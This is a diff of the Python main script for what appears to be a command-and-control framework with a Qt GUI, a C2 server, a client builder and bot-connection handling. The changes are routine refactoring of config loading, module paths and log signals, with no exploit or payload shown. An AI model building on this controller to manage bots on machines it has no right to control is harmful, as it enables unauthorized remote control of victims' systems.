@@ -5,7 +5,7 @@ import argparse
 import traceback
 
 from qtpy.QtWidgets import QApplication
-from qtpy.QtCore import Qt, QObject, qInstallMessageHandler, Slot
+from qtpy.QtCore import Qt, QObject, qInstallMessageHandler, Slot, Signal
 
 import qrainbowstyle
 from qrainbowstyle.extras import qt_message_handler
@@ -16,8 +16,11 @@ from core.Network import GUIServer, C2Server
 from core.build import ClientBuilder
 from core.config import ConfigManager
 from core.logger import Logger
-from client.utils import MessageDecoder, MessageEncoder
 from view.MainWindow import MainWindow
+
+
+MODULES_PATH = "./modules/"
+CLIENT_PATH = "./client/"
 
 
 class Main(QObject):
@@ -33,7 +36,6 @@ class Main(QObject):
         self.c2server = C2Server()
 
         self.config_manager = ConfigManager()
-        self.config_manager.config_missing.connect(self.on_config_missing)
 
         if args.reset:
             self.config_manager.delete_config()
@@ -44,10 +46,12 @@ class Main(QObject):
         else:
             config = self.config_manager.load()
             if config:
-                self.on_config_read(config)
+                self.read_config_file(config)
+            else:
+                self.start_first_setup()
 
     @Slot()
-    def on_config_missing(self):
+    def start_first_setup(self):
         """Start GUI server with no config file."""
         gui_ip, gui_port, gui_key = self.gui_server.start_setup()
         self.gui_server.save_config.connect(self.config_manager.save)
@@ -72,7 +76,7 @@ class Main(QObject):
             self.gui.connect_to_gui_server(gui_ip, gui_port, gui_key.decode())
 
     @Slot(dict)
-    def on_config_read(self, config: dict):
+    def read_config_file(self, config: dict):
         """Start GUI and C2 server."""
         self.logger.info("Configuration files found")
         gui_ip, gui_port, gui_key = config.get("gui_ip"), config.get("gui_port"), config.get("gui_key").encode()
@@ -128,6 +132,10 @@ class Main(QObject):
         self.c2server.send_info(bot, infos)
         self.gui_server.on_bot_connected(bot, ip, port)
 
+    @Slot(Signal)
+    def connect_log_signal(self, signal):
+        signal.connect(self.gui_server.on_log_signal)
+
     @Slot()
     def close(self):
         """Gracefully close server and GUI"""
@@ -178,7 +186,8 @@ if __name__ == '__main__':
         application_path = "."
     logging.debug("Application path is {}".format(application_path))
     os.chdir(application_path)
-    sys.path.append(os.path.abspath("./client/"))
+    sys.path.insert(0, os.path.abspath(MODULES_PATH))
+    sys.path.append(os.path.abspath(CLIENT_PATH))
 
     QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps)
     QApplication.setAttribute(Qt.AA_EnableHighDpiScaling)
@@ -195,4 +204,6 @@ if __name__ == '__main__':
     app.setFont(font)
 
     m = Main(args)
-    sys.exit(app.exec())
+    m.connect_log_signal(logger.install_signal_handler())
+
+    sys.exit(app.exec_())
